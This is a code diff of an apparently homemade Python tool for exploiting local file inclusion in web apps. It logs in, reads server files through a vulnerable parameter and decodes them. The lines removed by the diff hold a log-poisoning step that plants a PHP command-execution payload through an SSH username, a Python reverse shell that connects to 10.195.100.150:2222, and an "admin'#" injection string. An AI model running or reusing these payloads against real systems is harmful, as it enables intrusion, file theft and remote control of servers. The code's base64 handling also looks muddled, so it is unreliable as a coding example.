@@ -9,7 +9,7 @@ import urllib
 import re
 import os
 import subprocess
-import base64
+
 ssl._create_default_https_context = ssl._create_unverified_context  
 path = ('file://'+os.getcwd()+'/FileStore/')
 class Read_File:
@@ -35,12 +35,10 @@ class Read_File:
             and self.args.filelist:
                 self.Login_auth()
                 self.url_request()
-             #   self.Reverse_shell()
             elif not self.args.auth and self.args.Vulnurl\
             and not self.args.password and not self.args.user and self.args.Cookie\
             and self.args.filelist :
                 self.url_request()
-            #    self.Reverse_shell()
             else:
                 print("[+] Logic command  Error"+'\n'+'='*30)  
                 print('[+] To use LFI with login     : --auth --loginurl --Vulnurl --user --password --filelist --Cookie ')  
@@ -69,8 +67,6 @@ class Read_File:
                    request[f'{self.args.PassForm}']=f'{self.args.password}' 
             response   = request.submit()         
             self.info = response.info()
-           
-          #  self.info_req =  self.info 
             content    = response.read()  
             self.url = response.geturl()      
      def url_request(self):            
@@ -132,31 +128,7 @@ class Read_File:
                      print("[+] Full  URL           : ................ | : "+self.url.replace('\n',''))
                      print("[+] File Name           : ................ | : "+self.args.read.replace('/','',1).replace('/','_'))
                      print("[+] save Locatoin       : ................ | : "+path+self.ip_re.group()+"/"\
-                     +self.args.read.replace('/','',1).replace('/','_')      )                                                                               
-     def Reverse_shell(self):
-                 if 'log' in self.url :
-                    order2 = '''ssh '<?php system($_GET['cmd']); ?>'@192.168.56.107'''
-                    command_proc2 = ' gnome-terminal  -e ' +'"' + order2 +'"'               
-                    call_termminal = subprocess.call(command_proc2,shell=True,stderr=subprocess.PIPE)
-                    time.sleep(10)
-                    command ="""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.195.100.150",2222));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'"""
-                    fake_link = self.url.replace('\n','')+"&cmd="+command.replace('\n','')
-                    print(fake_link)
-                    request = mechanize.Browser()
-                    request.set_handle_robots(False)
-                    request.set_handle_redirect(True)
-                    request.set_handle_refresh(True, max_time=1)
-                    if self.args.Cookie:
-                       with open(self.args.Cookie,'r') as Cookie_file :
-                           Cookie =  Cookie_file.read() 
-                           request.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1)\
-                                             Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
-                                            ('Cookie',str(Cookie).replace('\n','')),
-                                            ('username',"admin'#"),
-                                            ('password','password')]
-                    feka_log = request.open(fake_link).read() 
-                    print(feka_log )
-                            
+                     +self.args.read.replace('/','',1).replace('/','_'))                                                                               
      def control(self): 
            parser = argparse.ArgumentParser(description="Usage: [OPtion] [arguments] [ -w ] [arguments]") 
            parser.add_argument("-UV ","--Vulnurl"     , action=None         ,required=True     ,help ="url Targst web") 
@@ -199,7 +171,8 @@ class Read_File:
                                with open('./FileStore/'+self.ip_re.group()+"/"+self.args.read.replace('/','',1).replace('/','__'),'a') as file2:
                                      base64 = file2.write(h) 
                                with open('./FileStore/'+self.ip_re.group()+"/"+self.args.read.replace('/','',1).replace('/','__'),'r') as file2: 
-                                    read_data = file2.read()  
+                                    read_data = file2.read() 
+                                    import base64   
                                     decoded64 = str(base64.b64decode(read_data))   
                                     read_data = decoded64.split("\\n") 
                                     for line in read_data :                                          
@@ -221,12 +194,13 @@ class Read_File:
                                 with open('./FileStore/'+self.ip_re.group()+"/"+self.args.read.replace('/','',1).replace('/','X'),'a') as File_1:  
                                      File_1.write(line) 
                                 with open('./FileStore/'+self.ip_re.group()+"/"+self.args.read.replace('/','',1).replace('/','X'),'r') as File_1:  
-                                     read_data = File_1.read()                                                        
-                                     decoded64 = str(base64.b64decode(read_data))
-                                     read_data = decoded64.split("\\n") 
-                                     for line in read_data :                                          
-                                          with open('./FileStore/'+self.ip_re.group()+"/"+self.args.read.replace('/','',1).replace('/','_'),'a') as File_2:
-                                             data_Finsh = File_2.write(line.replace("b'",'').replace("'",'')+'\n')                        
+                                     read_data = File_1.read() 
+                                import base64                                                           
+                                decoded64 = str(base64.b64decode(read_data))
+                                read_data = decoded64.split("\\n") 
+                                for line in read_data :                                          
+                                    with open('./FileStore/'+self.ip_re.group()+"/"+self.args.read.replace('/','',1).replace('/','_'),'a') as File_2:
+                                         data_Finsh = File_2.write(line.replace("b'",'').replace("'",'')+'\n')                        
                    if os.path.exists('./FileStore/'+self.ip_re.group()+'/index.txt'):
                       os.remove('./FileStore/'+self.ip_re.group()+'/index.txt')  
                       os.remove('./FileStore/'+self.ip_re.group()+"/"+self.args.read.replace('/','',1).replace('/','X'))             
